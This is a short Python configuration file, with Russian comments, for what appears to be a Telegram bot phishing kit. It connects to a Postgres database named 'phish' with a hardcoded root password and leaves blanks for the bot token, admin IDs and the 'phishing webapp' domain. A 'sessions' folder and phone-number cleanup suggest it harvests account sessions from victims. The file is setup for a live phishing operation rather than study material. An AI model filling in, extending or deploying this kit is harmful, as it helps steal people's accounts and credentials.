from utils.postgres_db import DB
import os

db_host = 'localhost' #url базы данных
db_port = 5432 # порт постгреса, по дефолту он запускается на этом порту, можно не трогать
db_user = 'postgres' # логин
dp_password = 'rootpass' # пароль 
db_name = 'phish' # имя базы данных

db: DB = DB(
    db_host, db_port, db_user,
    dp_password, db_name
)

TOKEN = '' #сюда токен от бота
DOMAIN = '' #для настройки вебхуков для бота, можно не трогать
ADMIN = [] # впишите сюда ID корневых администраторов через запятую, например: [234234, 234235251, 12152]
BOT_TIMEZONE = "Europe/Moscow"  # Time zone for bot

KEY_DOMAIN = '' # домен вебаппа, то есть самого фишинга
BAD_SYMBOLS = ['+', '(', '-', ')', ' '] # не трогать

SESSIONS_STORAGE = "sessions"
os.makedirs(SESSIONS_STORAGE, exist_ok=True)